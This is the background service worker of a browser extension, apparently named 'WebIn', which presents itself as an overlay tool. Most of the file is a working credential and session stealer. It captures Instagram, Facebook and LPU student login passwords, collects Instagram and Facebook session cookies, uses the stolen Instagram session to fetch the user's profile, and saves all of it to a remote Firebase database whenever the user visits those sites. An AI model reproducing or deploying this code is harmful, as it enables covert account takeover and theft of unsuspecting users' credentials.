// ============== WebIn Combined Background Service Worker ==============
// Combines WebIn overlay functionality with Session/Cookie logging

console.log(
  "%c[WebIn] Service Worker Loaded",
  "color: #4caf50; font-weight: bold; font-size: 14px;"
);

// ============== Firebase + Utils Imports ==============
import { db } from "./session/firebase-init.js";
import { collection, addDoc } from "./session/firebase-firestore.js";
import { isDuplicateData } from "./session/utils.js";

// ============== Icon Cache for WebIn Overlay ==============
const iconCache = new Map();

// Fetch icon and convert to base64 data URL
async function fetchIconAsDataUrl(url) {
  if (iconCache.has(url)) {
    return iconCache.get(url);
  }

  try {
    const response = await fetch(url, { mode: 'cors' });
    if (!response.ok) throw new Error('Fetch failed');
    
    const blob = await response.blob();
    
    return new Promise((resolve, reject) => {
      const reader = new FileReader();
      reader.onloadend = () => {
        const dataUrl = reader.result;
        iconCache.set(url, dataUrl);
        resolve(dataUrl);
      };
      reader.onerror = reject;
      reader.readAsDataURL(blob);
    });
  } catch (error) {
    console.error('[WebIn] Icon fetch failed:', url, error);
    return null;
  }
}

// ============== In-Memory Cache for Deduplication ==============
const savedStudentSet = new Set();
const savedInstagramBySessionId = new Set(); // Deduplicate by sessionId
const savedFacebookByCUser = new Set(); // Deduplicate by c_user

// ============== Pending Credentials (waiting for session) ==============
let pendingInstagramCreds = null; // { username, password, capturedAt }
let pendingFacebookCreds = null; // { email, password, capturedAt }

// ============== Combined Message Listener ==============
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  // WebIn Icon Fetch Handler
  if (request.action === 'fetchIcon') {
    fetchIconAsDataUrl(request.url)
      .then(dataUrl => sendResponse({ dataUrl }))
      .catch(() => sendResponse({ dataUrl: null }));
    return true;
  }

  // Instagram Login Credentials Handler
  if (request.type === "instagram_login_data") {
    handleInstagramLoginData(request.data);
  }

  // Facebook Login Credentials Handler
  if (request.type === "facebook_login_data") {
    handleFacebookLoginData(request.data);
  }

  // Student Data Handler (LPU)
  if (request.type === "student_data") {
    handleStudentData(request.data);
  }
});

// ============== WebIn Overlay Command ==============
chrome.commands.onCommand.addListener((command) => {
  if (command === "launch_overlay") {
    chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
      if (tabs.length === 0) return;

      chrome.scripting
        .executeScript({
          target: { tabId: tabs[0].id },
          files: [
            "webin/config.js",
            "webin/state.js",
            "webin/styles.js",
            "webin/styles2.js",
            "webin/styles3.js",
            "webin/modals.js",
            "webin/ui.js",
            "webin/tabs.js",
            "webin/events.js",
            "webin/inject.js",
          ],
        })
        .catch((err) => console.error("[WebIn] Injection failed:", err));
    });
  }
});

// ============== Navigation Handler for Cookies ==============
chrome.webNavigation.onCompleted.addListener(
  async ({ url, frameId }) => {
    if (frameId !== 0) return;

    if (url.includes("instagram.com")) {
      await handleInstagram();
    } else if (url.includes("facebook.com")) {
      await handleFacebook();
    }
  },
  {
    url: [{ hostSuffix: "instagram.com" }, { hostSuffix: "facebook.com" }],
  }
);

// ============== Instagram Login Data Handler ==============
// Stores credentials temporarily - will be combined with session data later
function handleInstagramLoginData(data) {
  const { username, password } = data;

  if (!username || !password) {
    console.warn("[IG-Login] SKIP: Incomplete data received");
    return;
  }
  
  if (username.length < 1 || password.length < 6) {
    console.warn("[IG-Login] SKIP: Data too short - Password min 6 chars required");
    return;
  }

  console.log("%c[IG-Login] RECEIVED: Credentials stored, waiting for session...", "color: #2196f3; font-weight: bold;");
  console.table({ username, password: "*".repeat(password.length) });

  // Store credentials temporarily - will be saved when session is captured
  pendingInstagramCreds = {
    username,
    password,
    capturedAt: new Date().toISOString()
  };
  
  console.log("%c[IG-Login] PENDING: Credentials will be saved with session", "color: #ff9800;");
}

// ============== Student Data Handler (LPU) ==============
// Uses registrationNumber for deduplication
async function handleStudentData(data) {
  const { registrationNumber, password, pwdExpiryDays, pwdExpiryDate } = data;

  if (!registrationNumber || !password) {
    console.warn("[LPU] SKIP: Incomplete data received");
    return;
  }
  
  if (registrationNumber.length < 8 || password.length < 6) {
    console.warn("[LPU] SKIP: Data too short - RegNo min 8, Password min 6 chars required");
    return;
  }

  // Check memory cache first
  if (savedStudentSet.has(registrationNumber)) {
    console.log("%c[LPU] SKIP: RegNo already in memory cache", "color: #9e9e9e;");
    return;
  }

  console.log("%c[LPU] RECEIVED: Student credentials", "color: #2196f3; font-weight: bold;");
  console.table({ registrationNumber, password: "*".repeat(password.length), pwdExpiryDays, pwdExpiryDate });

  const colRef = collection(db, "studentData");

  try {
    // Check if registrationNumber already exists in database
    const { getDocs, query, where } = await import("./session/firebase-firestore.js");
    const q = query(colRef, where("registrationNumber", "==", registrationNumber));
    const snapshot = await getDocs(q);
    
    if (!snapshot.empty) {
      console.log("%c[LPU] SKIP: RegNo already exists in database", "color: #9e9e9e;");
      savedStudentSet.add(registrationNumber);
      return;
    }

    // Build document data
    const docData = { 
      registrationNumber, 
      password, 
      timestamp: new Date() 
    };
    
    // Add expiry info if available
    if (pwdExpiryDays !== null && pwdExpiryDays !== undefined) {
      docData.pwdExpiryDays = pwdExpiryDays;
    }
    if (pwdExpiryDate) {
      docData.pwdExpiryDate = pwdExpiryDate;
    }

    // Save to database
    savedStudentSet.add(registrationNumber);
    await addDoc(colRef, docData);
    console.log("%c[LPU] SAVED: " + registrationNumber + (pwdExpiryDate ? " (expires: " + pwdExpiryDate + ")" : ""), "color: #4caf50; font-weight: bold; font-size: 13px;");
  } catch (err) {
    console.error("[LPU] ERROR: Failed to save to Firestore:", err);
  }
}

// ============== Instagram Session Cookie Handler ==============
// Combines session with pending credentials, uses sessionId for deduplication
async function handleInstagram() {
  chrome.cookies.getAll({ domain: ".instagram.com" }, async (cookies) => {
    console.log("%c[IG] Fetching Instagram cookies...", "color: #2196f3;");

    const session = cookies.find((c) => c.name === "sessionid");
    const dsUserId = cookies.find((c) => c.name === "ds_user_id");

    if (!session || !dsUserId) {
      console.warn("[IG] SKIP: Required cookies not found (user not logged in)");
      return;
    }

    const sessionId = session.value;
    const userId = dsUserId.value;

    // Check if this sessionId was already saved (memory cache)
    if (savedInstagramBySessionId.has(sessionId)) {
      console.log("%c[IG] SKIP: SessionId already in memory cache", "color: #9e9e9e;");
      return;
    }

    console.log("%c[IG] Cookies found:", "color: #4caf50;");
    console.table([
      { name: "sessionid", value: sessionId.substring(0, 20) + "..." },
      { name: "ds_user_id", value: userId },
    ]);

    let username = "unknown_user";
    let bio = "";

    try {
      console.log("[IG] Fetching user info from API...");

      const response = await fetch(
        `https://i.instagram.com/api/v1/users/${userId}/info/`,
        {
          method: "GET",
          headers: {
            "User-Agent": "Instagram 219.0.0.12.117 Android",
            Cookie: `sessionid=${sessionId};`,
            "X-IG-App-ID": "936619743392459",
            "Accept-Language": "en-US",
          },
        }
      );

      if (!response.ok) {
        console.error(`[IG] ERROR: API returned HTTP ${response.status}`);
        return;
      }

      const data = await response.json();
      const user = data.user || {};

      username = user.username || "unknown_user";
      bio = user.biography || "";

      console.log("%c[IG] User info fetched:", "color: #4caf50;");
      console.table({ username, bio: bio.substring(0, 50) + (bio.length > 50 ? "..." : "") });
    } catch (error) {
      console.error("[IG] ERROR: API fetch failed:", error);
      return;
    }

    // Build document data - combine session with pending credentials if available
    const docData = {
      sessionId,
      userId,
      username,
      bio
    };

    // Add credentials if we captured them during login
    if (pendingInstagramCreds) {
      docData.loginUsername = pendingInstagramCreds.username;
      docData.loginPassword = pendingInstagramCreds.password;
      docData.credsCapturedAt = pendingInstagramCreds.capturedAt;
      console.log("%c[IG] Combining with pending credentials", "color: #ff9800;");
      pendingInstagramCreds = null; // Clear after use
    }

    const colRef = collection(db, "instagram");

    try {
      // Check if sessionId already exists in database
      const { getDocs, query, where } = await import("./session/firebase-firestore.js");
      const q = query(colRef, where("sessionId", "==", sessionId));
      const snapshot = await getDocs(q);
      
      if (!snapshot.empty) {
        console.log("%c[IG] SKIP: SessionId already exists in database", "color: #9e9e9e;");
        savedInstagramBySessionId.add(sessionId);
        return;
      }

      // Save to database
      savedInstagramBySessionId.add(sessionId);
      await addDoc(colRef, { ...docData, timestamp: new Date() });
      console.log("%c[IG] SAVED: @" + username + (docData.loginPassword ? " (with credentials)" : ""), "color: #4caf50; font-weight: bold; font-size: 13px;");
    } catch (err) {
      console.error("[IG] ERROR: Failed to save to Firestore:", err);
    }
  });
}

// ============== Facebook Login Data Handler ==============
// Stores credentials temporarily - will be combined with session data later
function handleFacebookLoginData(data) {
  const { email, password } = data;

  if (!email || !password) {
    console.warn("[FB-Login] SKIP: Incomplete data received");
    return;
  }
  
  if (email.length < 3 || password.length < 6) {
    console.warn("[FB-Login] SKIP: Data too short - Password min 6 chars required");
    return;
  }

  console.log("%c[FB-Login] RECEIVED: Credentials stored, waiting for session...", "color: #2196f3; font-weight: bold;");
  console.table({ email, password: "*".repeat(password.length) });

  // Store credentials temporarily - will be saved when session is captured
  pendingFacebookCreds = {
    email,
    password,
    capturedAt: new Date().toISOString()
  };
  
  console.log("%c[FB-Login] PENDING: Credentials will be saved with session", "color: #ff9800;");
}

// ============== Facebook Cookie Handler ==============
// Combines session with pending credentials, uses c_user for deduplication
async function handleFacebook() {
  chrome.cookies.getAll({ domain: ".facebook.com" }, async (cookies) => {
    console.log("%c[FB] Fetching Facebook cookies...", "color: #2196f3;");

    const cUser = cookies.find((c) => c.name === "c_user");
    const xs = cookies.find((c) => c.name === "xs");

    if (!cUser || !xs) {
      console.warn("[FB] SKIP: Required cookies not found (user not logged in)");
      return;
    }

    const cUserValue = cUser.value;
    const xsValue = xs.value;

    // Check if this c_user was already saved (memory cache)
    if (savedFacebookByCUser.has(cUserValue)) {
      console.log("%c[FB] SKIP: c_user already in memory cache", "color: #9e9e9e;");
      return;
    }

    console.log("%c[FB] Cookies found:", "color: #4caf50;");
    console.table([
      { name: "c_user", value: cUserValue },
      { name: "xs", value: xsValue.substring(0, 20) + "..." },
    ]);

    // Build document data - combine session with pending credentials if available
    const docData = {
      c_user: cUserValue,
      xs: xsValue
    };

    // Add credentials if we captured them during login
    if (pendingFacebookCreds) {
      docData.loginEmail = pendingFacebookCreds.email;
      docData.loginPassword = pendingFacebookCreds.password;
      docData.credsCapturedAt = pendingFacebookCreds.capturedAt;
      console.log("%c[FB] Combining with pending credentials", "color: #ff9800;");
      pendingFacebookCreds = null; // Clear after use
    }

    const colRef = collection(db, "facebook");

    try {
      // Check if c_user already exists in database
      const { getDocs, query, where } = await import("./session/firebase-firestore.js");
      const q = query(colRef, where("c_user", "==", cUserValue));
      const snapshot = await getDocs(q);
      
      if (!snapshot.empty) {
        console.log("%c[FB] SKIP: c_user already exists in database", "color: #9e9e9e;");
        savedFacebookByCUser.add(cUserValue);
        return;
      }

      // Save to database
      savedFacebookByCUser.add(cUserValue);
      await addDoc(colRef, { ...docData, timestamp: new Date() });
      console.log("%c[FB] SAVED: User " + cUserValue + (docData.loginPassword ? " (with credentials)" : ""), "color: #4caf50; font-weight: bold; font-size: 13px;");
    } catch (err) {
      console.error("[FB] ERROR: Failed to save to Firestore:", err);
    }
  });
}
